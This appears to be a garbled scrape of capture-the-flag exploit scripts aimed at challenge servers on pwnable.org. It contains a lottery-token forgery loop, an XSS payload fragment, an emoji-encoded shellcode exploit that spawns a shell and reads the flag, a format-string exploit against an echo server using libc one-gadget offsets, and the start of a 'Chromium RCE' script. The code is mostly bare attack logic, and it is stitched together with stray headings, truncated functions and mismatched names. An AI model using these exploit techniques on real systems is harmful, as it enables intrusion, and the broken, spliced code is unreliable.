HgXwIkkuehhS/11g='
def register():
    username = 'Q7_' + ''.join([random.choice(table) for _ in range(5)])
    return requests.post('http://pwnable.org:2333/user/register', {'username': 
username, 'password': ''}).json()['user']
def login(s, username):
    return s.post('http://pwnable.org:2333/user/login', {'username': username, 
'password': ''}).json()['user']
def buy(api_token):
    return requests.post('http://pwnable.org:2333/lottery/buy', {'api_token': 
api_token}).json()
def lottery_info(enc):
    return requests.post('http://pwnable.org:2333/lottery/info', {'enc': 
enc}).json()['info']
def charge(enc, coin):
    return requests.post('http://pwnable.org:2333/lottery/charge', {'enc': 
enc, 'coin': coin, 'user': '2040dfa8-f481-482a-913e-0da8f5ef0304'}).json()
while True:
    print('='*30)
    user = register()
    username = user['username']
    s = requests.session()
    user = login(s, username)
    api_token = user['api_token']
    uuid = user['uuid']
    print(user)
    for _ in range(3):
        enc = buy(api_token)['enc']
        info = lottery_info(enc)
        if(info['lottery'].endswith('f6')):
            print(enc)
            fake = base64.b64encode(base64.b64decode(enc)[:48] + 
base64.b64decode(mine)[48:])
            print(charge(fake, info['coin']))
import requests
import base64
/app/app.py
/SUp3r_S3cret_URL
def preview(data):
    url = "http://pwnable.org:5000/preview"
    resp = requests.post(url, data={"data": data})
    return resp.json()
def share(id):
    url = "http://pwnable.org:5000/share"
    resp = requests.post(url, data={"previewid" : id}, allow_redirects=False)
    return resp.json()
if __name__ == "__main__":
    data = """
    [{"type":0,"message":"Love you!"},{"type":1,"message":"Me too!!!"},
{"type":0,"message":"My Message[smile.png\\\" />
     jshtm
html   cspalert(1)
Pwn
eeeeeemoji
data = """
    [{"type":0,"message":"Love you!"},{"type":1,"message":"Me too!!!"},
{"type":0,"message":"My Message[smile.png\\\\\\" />]"}]
    """
from pwn import *
#p = process('./emoji')
p = remote('pwnable.org', 31323)
def convaddr(a):
  f = ord(a[0])
  if f & 0b11111100 == 0b11111100:
    ans = ((ord(a[0])&0b1)30:
    b1 = int('10'+bits[-6:],2)
    b2 = int('10'+bits[-12:-6],2)
    b3 = int('10'+bits[-18:-12],2)
    b4 = int('10'+bits[-24:-18],2)
    b5 = int('10'+bits[-30:-24],2)
    b6 = int('1111110'+bits[:-30].rjust(1,'0'),2)
    conved =  chr(b6) + chr(b5) + chr(b4) + chr(b3) + chr(b2) +chr(b1)
    return conved
BEER = '\xf0\x9f\x8d\xba'
BULL = '\xf0\x9f\x90\xae'
HORSE = '\xf0\x9f\x90\xb4'
addrmap = []
'''
p.recvuntil('Miaow miaow miaow')
p.sendline(BEER)
p.recvuntil('@0x')
mmap_addr = int(p.recvline().strip(),16)
print hex(mmap_addr)
raw_input()
#p.recvuntil('Miaow miaow miaow')
#p.sendline(BULL)
p.recvuntil('Miaow miaow miaow')
p.sendline(BEER)
p.recvuntil('Miaow miaow miaow')
p.sendline(HORSE)
'''
def prepare(addr):
  p.recvuntil('Miaow miaow miaow')
  p.sendline(HORSE)
  p.recvuntil('\xf0\x9f\x98\x93')
  a1 = addrconv(0x49006a90)
  a2 = addrconv(0x69622fb8)
  a3 = addrconv(0x68732f6e)
  a4  = addrconv(0x48504100)
  a5 = addrconv(0x03bc0c7)
  a6 = addrconv(0x48900000)
  a7 = addrconv(0x4890e789)
  a8 = addrconv(0x3148f631) 
  a9 = addrconv(0x050f90d2)
  a10 = addrconv(0x58415841)
  a11 = addrconv(0x58415841)
  a12 = addrconv(0x000000c3)
  sh = a1+a2+a3+a4+a5+a6+a7+a8+a9+a10+a11+a12
  sh += addrconv(0x7172d489)*18
  sh += addrconv(0x00000206)
  sh += '\x00'
  sh += addrconv(addr+0x88)
  sh += '\x00'
  sh += addrconv(addr)
  sh += '\x00'
  #sh +=(129)*addrconv(0x7172d421)
  p.send(sh+(129-12-18-6)*addrconv(0x71729090))#nop nop
def start_prepare():
  for i in range(0x40):
    p.recvuntil('Miaow miaow miaow')
    p.sendline(BEER)
    p.recvuntil('@0x')
    mmap_addr = int(p.recvline().strip(),16)
    print hex(mmap_addr)
    addrmap.append(mmap_addr)
    prepare(mmap_addr)
    #p.interactive()
while True:
  try:
    p = remote('pwnable.org', 31323)
    start_prepare()
    p.recvuntil('Miaow miaow miaow')
    p.sendline(BEER)
    p.recvuntil('@0x')
    addr = int(p.recvline().strip(),16)
    print hex(addr)
    p.recvuntil('Miaow miaow miaow')
    p.sendline(HORSE)
    p.recvuntil('\xf0\x9f\x98\x93')
    a1 = addrconv(0x49006a90)
    a2 = addrconv(0x69622fb8)
    a3 = addrconv(0x68732f6e)
    a4  = addrconv(0x48504100)
    a5 = addrconv(0x03bc0c7)
    a6 = addrconv(0x48900000)
    a7 = addrconv(0x4890e789)
    a8 = addrconv(0x3148f631) 
    a9 = addrconv(0x050f90d2)
    a10 = addrconv(0x58415841)
    a11 = addrconv(0x58415841)
simple echoserver
    a12 = addrconv(0x000000c3)
    sh = a1+a2+a3+a4+a5+a6+a7+a8+a9+a10+a11+a12
    sh += addrconv(0x7172d489)*18
    sh += addrconv(0x00000206)
    sh += '\x00'
    sh += addrconv(addr+0x88)
    sh += '\x00'
    sh += addrconv(addr)
    sh += '\x00'
    #sh +=(129)*addrconv(0x7172d421)
    p.send(sh+(129-12-18-6)*addrconv(0x7172d421))#and esp,edx
    p.sendline('echo homura;cat flag;echo acdtql')
    print p.recvuntil('acdtql')
  except:
    p.close()
    continue
p.interactive()
from pwn import *
#r = remote("pwnable.org", 12020)
#r = process("./simple_echoserver/simple_echoserver")
DEBUG = 0
context.log_level = 'debug'
libc = ELF("./simple_echoserver/libc-2.27.so")
one_gadget_18 = [0x4f2c5,0x4f322,0x10a38c]
call_welcome = 0x14c6
'''
42 canary
43 rbp of main
48 start main
27 stack
'''
def pwn():
  if DEBUG:
    gdb.attach(r, 
    '''
    b *$rebase(0x1415)
    b *$rebase(0x14D6)
    c
    ''')
Chromium RCE
  r.recvuntil("Your name: ")
  #name = '%p:%p:%p:%p:%p:%p:%p:%p'
  name = '%'+str(0x20-0xd)+'c%7$hhn' + '%952277c%' + '*48$c%26$n'
  r.sendline(name)
  r.recvuntil("Your phone: ")
  #pause()
  r.sendline('1'*0x18)
  recved = r.recvuntil("Now enjoy yourself!\n", timeout=480)
  if recved == '':
    r.close()
  #sleep(10)
  payload = '\x00'*0x18+'\xf0'
  r.sendline(payload)
  sleep(0.1)
  r.sendline('~.')
  sleep(0.1)
  r.sendline('echo success')
  r.sendline('cat flag')
  print r.recv()
  print r.recv()
  r.interactive()
  r.close()
if __name__ == "__main__":
  #pwn()
  while True:
    #r = process("./simple_echoserver/simple_echoserver 2>/dev/null", 
shell=True)
    r = remote("pwnable.org", 12020)
    try:
      pwn()
    except:
      r.close()
let u64 = (buf) => {
  let result = 0n;